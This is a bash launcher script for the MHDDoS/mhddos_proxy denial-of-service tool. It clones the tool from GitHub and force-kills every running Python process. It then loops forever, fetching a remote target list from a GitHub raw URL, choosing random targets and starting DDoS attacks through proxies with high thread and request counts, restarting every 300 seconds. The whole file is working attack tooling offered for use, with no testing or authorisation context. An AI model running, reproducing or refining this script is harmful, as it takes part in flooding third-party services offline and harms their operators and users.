#!/bin/bash



ulimit -n 1048576
# TO DELETE WHEN EVERYTHING WILL BE OKAY WITH ORIGINAL REPO
#cd ~/mhddos_proxy
#sudo git checkout 49a4c8b034c2f7a5d3d0548e892414a2ebd30076
#sudo pip3 install -r requirements.txt

#Just in case kill previous copy of mhddos_proxy
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
taskkill -f -im python.exe
taskkill -f -im python3.8.exe
taskkill -f -im python3.9.exe
taskkill -f -im python3.10.exe
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"


restart_interval="300"

#parameters that passed to python scrypt
threads="${2:-1000}"
threads="-t $threads"
rpc="${3:-2000}"
rpc="--rpc $rpc"
proxy_interval="1200"
proxy_interval="-p $proxy_interval"
num_of_copies="${1:-1}"





#Installing files into correct directory
cd ~
git clone https://github.com/Maxssaf/runner_for_windows.git
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd ~/mhddos_proxy
python -m pip install -r requirements.txt


while true
echo -e "#####################################\n"
do
   # Get number of targets in runner_targets. Only strings that are not commented out are used. Everything else is omitted.
   list_size=$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]" | wc -l)

   echo -e "\nNumber of targets in list: " $list_size "\n"

   # Create list with random numbers. To choose random targets from list on next step.
   random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
   echo -e "random number(s): " $random_numbers "\n"

   # Print all randomly selected targets on screen
   echo -e "Choosen target(s): "
   for i in $random_numbers
   do
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
            echo -e " "$cmd_line"\n"
            #echo $cmd_line
            #echo $cmd_line $proxy_interval $threads $rpc
            cd ~/mhddos_proxy
            python runner.py --table $cmd_line $proxy_interval $rpc&    ##$threads
            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
   done
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
   	taskkill -f -im python.exe
	taskkill -f -im python3.8.exe
	taskkill -f -im python3.9.exe
	taskkill -f -im python3.10.exe
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
	
done
